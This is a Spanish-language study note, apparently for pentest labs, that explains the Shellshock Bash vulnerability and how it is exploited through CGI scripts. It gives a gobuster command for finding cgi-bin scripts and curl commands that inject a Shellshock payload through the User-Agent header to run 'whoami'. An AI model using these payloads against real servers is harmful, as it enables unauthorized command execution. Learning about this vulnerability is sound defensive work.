-- - 
Un ataque Shellshock es un tipo de ataque informático que aprovecha una vulnerabilidad en el intérprete de comandos Bash en sistemas operativos basados en Unix y Linux. Esta vulnerabilidad se descubrió en 2014 y se considera uno de los ataques más grandes y generalizados en la historia de la informática.

Esta vulnerabilidad en Bash permite a los atacantes ejecutar comandos maliciosos en el sistema afectado, lo que les permite tomar el control del sistema y acceder a información confidencial, modificar archivos, instalar programas maliciosos, etc.

La vulnerabilidad Shellshock se produce en el intérprete de comandos Bash, que es utilizado por muchos sistemas operativos Unix y Linux para ejecutar scripts de shell. El problema radica en la forma en que Bash maneja las variables de entorno. Los atacantes pueden inyectar código malicioso en estas variables de entorno, las cuales Bash ejecuta sin cuestionar su origen o contenido.

Los atacantes pueden explotar esta vulnerabilidad a través de diferentes vectores de ataque. Uno de ellos es a través del User-Agent, que es la información que el navegador web envía al servidor web para identificar el tipo de navegador y sistema operativo que se está utilizando. Los atacantes pueden manipular el User-Agent para incluir comandos maliciosos, que el servidor web ejecutará al recibir la solicitud.

Por lo general siempre es factible intentar el Shell Shock Attack si encontramos el directorio cgi-bin.
-- -
Una vez encontrado el directorio cgi-bin, lo ideal es enumerar archivos con extensiones; pl,sh,cgi.
```bash
gobuster dir -u http://localhost/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi -v
```
 Luego de haber encontrado un archivo dentro de ese directorio podemos proceder a intentar ejecutar comando con el uso de curl mediante el User-Agent
 ```bash
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; /usr/bin/whoami"
curl -s http://localhost/cgi-bin/status -H "User-Agent: () { :; }; echo; /usr/bin/whoami" ---> Si no reporta nada el comando anterior le metemos un echo antes
```